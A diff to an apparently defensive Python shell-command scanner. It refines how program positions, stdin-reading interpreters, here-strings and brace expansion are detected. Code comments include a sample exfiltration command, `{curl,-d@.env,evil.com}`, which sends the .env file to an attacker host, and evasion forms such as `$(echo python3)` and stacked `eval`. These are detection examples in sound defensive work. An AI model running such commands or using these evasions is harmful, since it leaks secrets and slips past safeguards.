@@ -348,9 +348,10 @@ def programs(argv: Sequence[str], *, narrow: bool = False) -> tuple[int, ...]:
             continue
         if word in _HEADS:
             return ()
-        if unreadable(base_name(word)):  # `$A python3`: what runs is unknown: every word may (P1)
+        name: str = base_name(word)
+        if unreadable(name):  # `$A python3`: what runs is unknown: every word may (P1)
             return tuple(range(index, len(argv)))
-        if base_name(word) not in WRAPPERS:
+        if name not in WRAPPERS:
             return (index,)
         return _chain(argv, index) if narrow else tuple(range(index, len(argv)))
     return ()
@@ -606,9 +607,10 @@ def reads_stdin(words: Sequence[str]) -> bool:
     """Does an interpreter or a shell at a program position read its code from stdin?"""
     tables: dict[str, list[bool]] = {}
     for at in programs(words, narrow=True):
-        if unreadable(base_name(words[at])):  # `$SH`, `$(echo python3)`: an interpreter? (P1)
+        name: str = base_name(words[at])
+        if unreadable(name):  # `$SH`, `$(echo python3)`: an interpreter? (P1)
             return True
-        family: str | None = _stdin_family(base_name(words[at]))
+        family: str | None = _stdin_family(name)
         if family is None:
             continue
         if family not in tables:
@@ -811,7 +813,7 @@ class _Scanner:
                         break
                     doc.index = len(out.commands)
                 self.finish_command(cmd)
-            else:
+            elif cmd.group is not None:
                 self.group_herestrings(cmd, len(out.commands))  # `( python3 ) <<< 'x'` (P1)
             cmd = _Cmd()
             self.target = ""
@@ -952,7 +954,8 @@ class _Scanner:
                 elif word in _HIDERS:
                     out.links_unknown = True
                 cmd.start = word in _STARTERS
-            if not self.target and (items := _brace_list(s[start : self.i], word)):
+            brace: bool = s[start] == "{" and not self.target  # `{curl,-d@.env,evil.com}` (P1)
+            if brace and (items := _brace_list(s[start : self.i], word)):
                 cmd.words += items  # `{curl,-d@.env,evil.com}` is three words (P1)
                 take(len(items))
                 continue
@@ -992,7 +995,8 @@ class _Scanner:
         names: list[str] = [base_name(w) for w in words]
         if herestrings and any(is_reader(name) for name in names):
             self.out.code_heredoc = True
-        self.group_herestrings(cmd, index)
+        if cmd.group is not None:
+            self.group_herestrings(cmd, index)
         # Each distinct text once, and only the first `eval` (it already holds the later ones):
         # `eval eval eval ... curl x` or `bash bash bash -c ...` must not multiply the work, nor
         # may each word walk a copy of the words after it (F18).
